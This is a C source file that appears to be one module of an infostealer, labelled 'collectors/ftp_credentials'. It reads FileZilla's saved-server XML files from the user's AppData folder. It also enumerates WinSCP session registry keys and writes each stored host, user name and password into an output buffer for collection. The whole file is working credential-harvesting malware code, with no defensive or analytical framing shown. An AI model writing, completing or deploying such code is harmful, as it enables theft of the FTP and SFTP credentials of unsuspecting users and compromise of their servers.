// chunk: collectors/ftp_credentials
// depends: core/emit_buffer, core/file_ops
// provides: collect_ftp_clients
// headers: shlobj.h

#ifndef CHUNK_FTP_CREDENTIALS
#define CHUNK_FTP_CREDENTIALS

#include <shlobj.h>

static void collect_ftp_clients(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    char fz_recent[MAX_PATH], fz_site[MAX_PATH];
    snprintf(fz_recent, MAX_PATH, "%s\\FileZilla\\recentservers.xml", roaming);
    snprintf(fz_site,   MAX_PATH, "%s\\FileZilla\\sitemanager.xml",   roaming);

    int found = 0;
    if (file_exists(fz_recent) || file_exists(fz_site)) {
        if (!found) emitf("=== FTP CREDENTIALS ===\r\n");
        found = 1;
        if (file_exists(fz_recent)) {
            emitf("[FileZilla recentservers.xml]\r\n");
            emit_file(fz_recent, 1*1024*1024);
        }
        if (file_exists(fz_site)) {
            emitf("[FileZilla sitemanager.xml]\r\n");
            emit_file(fz_site, 1*1024*1024);
        }
    }

    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        if (!found) emitf("=== FTP CREDENTIALS ===\r\n");
        found = 1;
        emitf("[WinSCP sessions]\r\n");
        char name[256]; DWORD idx = 0, nsz;
        while (1) {
            nsz = sizeof(name);
            if (RegEnumKeyExA(hk, idx++, name, &nsz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            HKEY sess;
            if (RegOpenKeyExA(hk, name, 0, KEY_READ, &sess) == ERROR_SUCCESS) {
                char host[256] = {0}, user[256] = {0}, pass[256] = {0};
                DWORD hs = sizeof(host), us = sizeof(user), ps = sizeof(pass);
                RegQueryValueExA(sess, "HostName", NULL, NULL, (BYTE*)host, &hs);
                RegQueryValueExA(sess, "UserName", NULL, NULL, (BYTE*)user, &us);
                RegQueryValueExA(sess, "Password", NULL, NULL, (BYTE*)pass, &ps);
                emitf("  %s@%s pass=%s\r\n", user, host, pass[0] ? pass : "(key-based)");
                RegCloseKey(sess);
            }
        }
        RegCloseKey(hk);
    }

    if (found) emitf("\r\n");
}

#endif
